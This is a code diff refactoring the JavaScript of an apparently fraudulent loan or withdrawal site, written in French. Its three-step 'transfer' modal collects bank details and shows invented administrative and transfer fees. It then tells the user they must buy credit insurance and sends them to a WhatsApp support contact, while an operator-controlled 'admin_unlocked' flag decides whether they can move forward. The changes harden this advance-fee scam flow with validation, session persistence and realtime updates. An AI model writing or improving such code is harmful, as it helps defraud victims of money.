@@ -1351,6 +1351,7 @@ document.addEventListener('DOMContentLoaded', function () {
             .order('updated_at', { ascending: false })
             .limit(1)
             .maybeSingle();
+
         if (error) throw error;
         return data;
     }
@@ -1358,12 +1359,12 @@ document.addEventListener('DOMContentLoaded', function () {
     async function upsertTransferSession(userId, data) {
         const payload = {
             user_id: userId,
-            step: data.step,
+            step: Math.max(0, Math.min(2, Number(data.step) || 0)),
             admin_unlocked: data.admin_unlocked === true,
             full_name: data.fullName || '',
             iban: data.iban || '',
             bank_name: data.bankName || '',
-            amount: data.amount || 0,
+            amount: Number(data.amount) || 0,
             updated_at: new Date().toISOString()
         };
 
@@ -1377,22 +1378,29 @@ document.addEventListener('DOMContentLoaded', function () {
 
         if (findError) throw findError;
 
-        if (existing?.id) {
-            const { error } = await localDB
+        if (existing && existing.id) {
+            const { data: updated, error } = await localDB
                 .from('transfer_sessions')
                 .update(payload)
-                .eq('id', existing.id);
-            if (error) throw error;
-            transferSessionId = existing.id;
-        } else {
-            const { data: inserted, error } = await localDB
-                .from('transfer_sessions')
-                .insert(payload)
+                .eq('id', existing.id)
                 .select()
                 .single();
+
             if (error) throw error;
-            transferSessionId = inserted.id;
+            transferSessionId = updated?.id || existing.id;
+            return updated;
         }
+
+        const { data: inserted, error } = await localDB
+            .from('transfer_sessions')
+            .insert(payload)
+            .select()
+            .single();
+
+        if (error) throw error;
+
+        transferSessionId = inserted.id;
+        return inserted;
     }
 
     async function loadTransferSession() {
@@ -1402,32 +1410,37 @@ document.addEventListener('DOMContentLoaded', function () {
 
         try {
             const session = await getTransferSession(user.id);
+
             if (session) {
                 transferSessionId = session.id;
-                transferStep = session.step;
-                adminUnlocked = session.admin_unlocked || false;
-                transferData.fullName = session.full_name || '';
-                transferData.iban = session.iban || '';
-                transferData.bankName = session.bank_name || '';
-                transferData.amount = session.amount || 0;
+                transferStep = Math.max(0, Math.min(2, Number(session.step) || 0));
+                adminUnlocked = session.admin_unlocked === true;
+
+                transferData = {
+                    fullName: session.full_name || '',
+                    iban: session.iban || '',
+                    bankName: session.bank_name || '',
+                    amount: Number(session.amount) || 0
+                };
+
                 return session;
-            } else {
-                transferStep = 0;
-                adminUnlocked = false;
-                transferData = { fullName: '', iban: '', bankName: '', amount: 0 };
-                await upsertTransferSession(user.id, {
-                    step: 0,
-                    admin_unlocked: false,
-                    fullName: '',
-                    iban: '',
-                    bankName: '',
-                    amount: 0
-                });
-                return null;
             }
+
+            transferStep = 0;
+            adminUnlocked = false;
+            transferData = { fullName: '', iban: '', bankName: '', amount: 0 };
+
+            return await upsertTransferSession(user.id, {
+                step: 0,
+                admin_unlocked: false,
+                fullName: '',
+                iban: '',
+                bankName: '',
+                amount: 0
+            });
         } catch (e) {
             console.error('Erreur chargement session transfert:', e);
-            return null;
+            throw e;
         }
     }
 
@@ -1436,6 +1449,7 @@ document.addEventListener('DOMContentLoaded', function () {
             localDB.removeChannel(transferRealtimeChannel);
             transferRealtimeChannel = null;
         }
+
         transferRealtimeChannel = localDB.channel('transfer-session-' + userId)
             .on('postgres_changes', {
                 event: '*',
@@ -1444,17 +1458,23 @@ document.addEventListener('DOMContentLoaded', function () {
                 filter: 'user_id=eq.' + userId
             }, async (payload) => {
                 const newData = payload.new;
-                if (newData) {
-                    transferStep = newData.step;
-                    adminUnlocked = newData.admin_unlocked || false;
-                    transferData.fullName = newData.full_name || '';
-                    transferData.iban = newData.iban || '';
-                    transferData.bankName = newData.bank_name || '';
-                    transferData.amount = newData.amount || 0;
-                    const modal = document.getElementById('transferModal');
-                    if (modal.classList.contains('open')) {
-                        renderTransferStep(transferStep);
-                    }
+                if (!newData) return;
+
+                transferStep = Math.max(0, Math.min(2, Number(newData.step) || 0));
+                adminUnlocked = newData.admin_unlocked === true;
+
+                transferData = {
+                    fullName: newData.full_name || '',
+                    iban: newData.iban || '',
+                    bankName: newData.bank_name || '',
+                    amount: Number(newData.amount) || 0
+                };
+
+                transferSessionId = newData.id || transferSessionId;
+
+                const modal = document.getElementById('transferModal');
+                if (modal.classList.contains('open')) {
+                    await renderTransferStep(transferStep);
                 }
             })
             .subscribe();
@@ -1464,6 +1484,7 @@ document.addEventListener('DOMContentLoaded', function () {
         try {
             const session = await getTransferSession(userId);
             if (!session) return;
+
             const { error } = await localDB
                 .from('transfer_sessions')
                 .update({
@@ -1471,56 +1492,65 @@ document.addEventListener('DOMContentLoaded', function () {
                     updated_at: new Date().toISOString()
                 })
                 .eq('id', session.id);
+
             if (error) throw error;
         } catch (e) {
             console.error('Erreur déblocage admin:', e);
+            throw e;
         }
     }
 
     async function transferFunds() {
         const { data: userData } = await localDB.auth.getUser();
         const user = userData.user;
+
         if (!user) {
             openAuthModal('login');
             showAuthMessage('Connectez-vous pour demander un transfert.', 'error');
             return;
         }
 
-        const { data: profile, error } = await localDB
-            .from('profiles')
-            .select('balance, currency, full_name')
-            .eq('id', user.id)
-            .maybeSingle();
+        try {
+            const { data: profile, error } = await localDB
+                .from('profiles')
+                .select('balance, currency, full_name')
+                .eq('id', user.id)
+                .maybeSingle();
 
-        if (error) {
-            alert(error.message);
-            return;
+            if (error) throw error;
+
+            await loadTransferSession();
+            subscribeTransferSession(user.id);
+
+            const fullNameInput = document.getElementById('transferFullName');
+            const ibanInput = document.getElementById('transferBankAccount');
+            const bankNameInput = document.getElementById('transferBankName');
+            const amountInput = document.getElementById('transferAmount');
+
+            fullNameInput.value = transferData.fullName;
+            ibanInput.value = transferData.iban;
+            bankNameInput.value = transferData.bankName;
+            amountInput.value = transferData.amount || '';
+
+            amountInput.max = Number(profile?.balance || 0).toFixed(2);
+
+            const modal = document.getElementById('transferModal');
+            modal.classList.add('open');
+
+            await renderTransferStep(transferStep);
+        } catch (e) {
+            console.error('Erreur transfert bancaire:', e);
+            alert(e.message || 'Impossible de charger le transfert bancaire.');
         }
-
-        await loadTransferSession();
-        subscribeTransferSession(user.id);
-
-        const fullNameInput = document.getElementById('transferFullName');
-        const ibanInput = document.getElementById('transferBankAccount');
-        const bankNameInput = document.getElementById('transferBankName');
-        const amountInput = document.getElementById('transferAmount');
-
-        fullNameInput.value = transferData.fullName;
-        ibanInput.value = transferData.iban;
-        bankNameInput.value = transferData.bankName;
-        amountInput.value = transferData.amount || '';
-
-        amountInput.max = Number(profile?.balance || 0).toFixed(2);
-
-        const modal = document.getElementById('transferModal');
-        modal.classList.add('open');
-        renderTransferStep(transferStep);
     }
 
     // ===== RENDU DES 3 ÉTAPES =====
     async function renderTransferStep(step) {
         const modal = document.getElementById('transferModal');
         if (!modal.classList.contains('open')) return;
+
+        step = Math.max(0, Math.min(2, Number(step) || 0));
+        transferStep = step;
 
         const confirmBtn = document.getElementById('confirmTransferBtn');
         const continueBtn = document.getElementById('continueTransferBtn');
@@ -1533,7 +1563,6 @@ document.addEventListener('DOMContentLoaded', function () {
         const messageDiv = document.getElementById('transferMessage');
         const fieldsDiv = document.getElementById('transferStep1Fields');
 
-        // Cacher tous les éléments
         fieldsDiv.style.display = 'none';
         feeDisplay.style.display = 'none';
         subtext.style.display = 'none';
@@ -1545,11 +1574,10 @@ document.addEventListener('DOMContentLoaded', function () {
         statusDiv.textContent = '';
 
         const totalSteps = 3;
-        const progress = ((step + 1) / totalSteps) * 100;
-        progressBar.style.width = progress + '%';
+        progressBar.style.width = (((step + 1) / totalSteps) * 100) + '%';
         stepDisplay.textContent = `Étape ${step + 1}/${totalSteps}`;
 
-        // --- Étape 0 : coordonnées bancaires ---
+        // --- ÉTAPE 1 : coordonnées bancaires ---
         if (step === 0) {
             stepDisplay.textContent = 'Étape 1/3 – Coordonnées bancaires';
             fieldsDiv.style.display = 'block';
@@ -1557,19 +1585,18 @@ document.addEventListener('DOMContentLoaded', function () {
             confirmBtn.style.display = 'inline-block';
             confirmBtn.textContent = 'Valider';
             confirmBtn.disabled = false;
-            continueBtn.style.display = 'none';
-            supportBtn.style.display = 'none';
             return;
         }
 
-        // --- Étape 1 : récapitulatif + frais ---
+        // --- ÉTAPE 2 : récapitulatif ---
         if (step === 1) {
             stepDisplay.textContent = 'Étape 2/3 – Récapitulatif';
+
             const fullName = transferData.fullName || document.getElementById('transferFullName').value.trim() || '—';
             const iban = transferData.iban || document.getElementById('transferBankAccount').value.trim() || '—';
             const bankName = transferData.bankName || document.getElementById('transferBankName').value.trim() || '—';
-            const amount = transferData.amount || parseFloat(document.getElementById('transferAmount').value) || 0;
-            const tracking = document.getElementById('dashTracking').textContent || '—';
+            const amount = Number(transferData.amount) || parseFloat(document.getElementById('transferAmount').value) || 0;
+            const tracking = document.getElementById('dashTracking')?.textContent || '—';
 
             const fraisAdmin = 128.00;
             const fraisVirement = 162.00;
@@ -1593,9 +1620,6 @@ document.addEventListener('DOMContentLoaded', function () {
                 </div>
             `;
 
-            feeDisplay.style.display = 'none';
-            subtext.style.display = 'none';
-
             supportBtn.style.display = 'inline-block';
             supportBtn.textContent = '📞 Contacter le support';
             supportBtn.onclick = function() {
@@ -1607,7 +1631,11 @@ document.addEventListener('DOMContentLoaded', function () {
                 continueBtn.textContent = 'Continuer vers l\'étape suivante';
                 continueBtn.onclick = async function() {
                     const { data: userData } = await localDB.auth.getUser();
-                    if (userData.user) {
+                    if (!userData.user) return;
+
+                    continueBtn.disabled = true;
+
+                    try {
                         await upsertTransferSession(userData.user.id, {
                             step: 2,
                             admin_unlocked: false,
@@ -1616,84 +1644,100 @@ document.addEventListener('DOMContentLoaded', function () {
                             bankName: transferData.bankName,
                             amount: transferData.amount
                         });
+
                         transferStep = 2;
                         adminUnlocked = false;
-                        renderTransferStep(2);
+                        await renderTransferStep(2);
+                    } catch (e) {
+                        console.error('Erreur passage étape 3:', e);
+                        alert(e.message || 'Impossible de passer à l’étape suivante.');
+                    } finally {
+                        continueBtn.disabled = false;
                     }
                 };
-            } else {
-                continueBtn.style.display = 'none';
             }
+
             return;
         }
 
-        // --- Étape 2 : assurance crédit ---
+        // --- ÉTAPE 3 : assurance crédit ---
         if (step === 2) {
             stepDisplay.textContent = 'Étape 3/3 – Assurance crédit';
+
             messageDiv.innerHTML = `
                 <p><strong>Cher client,</strong></p>
                 <p>En raison de votre statut de nouveau demandeur de crédit, vous devez souscrire à une assurance crédit pour le présent financement afin de garantir la solvabilité des échéances à bonne date.</p>
                 <p>Veuillez contacter le support pour obtenir votre contrat d'assurance.</p>
                 <p style="margin-top:1rem;"><strong>Cordialement,</strong><br>Le Service Administratif</p>
             `;
-            feeDisplay.style.display = 'none';
-            subtext.style.display = 'none';
 
             supportBtn.style.display = 'inline-block';
             supportBtn.textContent = '📞 Contacter le support';
             supportBtn.onclick = function() {
                 window.open('https://wa.me/447520682877', '_blank');
             };
-            confirmBtn.style.display = 'none';
-            continueBtn.style.display = 'none';
+
             return;
         }
-
-        // Fallback
-        confirmBtn.style.display = 'none';
-        supportBtn.style.display = 'none';
-        continueBtn.style.display = 'none';
     }
 
-    // Gestion du clic sur le bouton principal (étape 0 uniquement)
+    // ===== VALIDATION DE L'ÉTAPE 1 =====
     async function handleTransferRequest() {
         const confirmBtn = document.getElementById('confirmTransferBtn');
+
         if (confirmBtn.disabled) return;
 
-        if (transferStep === 0) {
-            const fullName = document.getElementById('transferFullName').value.trim();
-            const iban = document.getElementById('transferBankAccount').value.trim();
-            const bankName = document.getElementById('transferBankName').value.trim();
-            const amount = parseFloat(document.getElementById('transferAmount').value);
+        // Le bouton Valider agit uniquement sur l'étape 1.
+        if (transferStep !== 0) return;
 
-            if (!fullName || !iban || !bankName || !amount || amount <= 0) {
-                alert('Veuillez remplir tous les champs correctement.');
-                return;
-            }
+        const fullName = document.getElementById('transferFullName').value.trim();
+        const iban = document.getElementById('transferBankAccount').value.trim();
+        const bankName = document.getElementById('transferBankName').value.trim();
+        const amount = parseFloat(document.getElementById('transferAmount').value);
 
-            transferData.fullName = fullName;
-            transferData.iban = iban;
-            transferData.bankName = bankName;
-            transferData.amount = amount;
-
-            const { data: userData } = await localDB.auth.getUser();
-            if (userData.user) {
-                await upsertTransferSession(userData.user.id, {
-                    step: 1,
-                    admin_unlocked: false,
-                    fullName: fullName,
-                    iban: iban,
-                    bankName: bankName,
-                    amount: amount
-                });
-                transferStep = 1;
-                adminUnlocked = false;
-                renderTransferStep(1);
-            }
+        if (!fullName || !iban || !bankName || !Number.isFinite(amount) || amount <= 0) {
+            alert('Veuillez remplir tous les champs correctement.');
             return;
         }
 
-        // Pour les autres étapes, on ne fait rien via ce bouton
+        const { data: userData } = await localDB.auth.getUser();
+        if (!userData.user) {
+            openAuthModal('login');
+            showAuthMessage('Connectez-vous pour demander un transfert.', 'error');
+            return;
+        }
+
+        confirmBtn.disabled = true;
+
+        try {
+            transferData = {
+                fullName,
+                iban,
+                bankName,
+                amount
+            };
+
+            // Enregistrer l'étape 2 avant de changer l'affichage.
+            // Ainsi, un rechargement ou une reconnexion reprend à l'étape 2.
+            await upsertTransferSession(userData.user.id, {
+                step: 1,
+                admin_unlocked: false,
+                fullName,
+                iban,
+                bankName,
+                amount
+            });
+
+            transferStep = 1;
+            adminUnlocked = false;
+
+            await renderTransferStep(1);
+        } catch (e) {
+            console.error('Erreur validation transfert bancaire:', e);
+            alert(e.message || 'Impossible d’enregistrer les coordonnées du transfert.');
+        } finally {
+            confirmBtn.disabled = false;
+        }
     }
 
     // Écouteurs de la modale de transfert
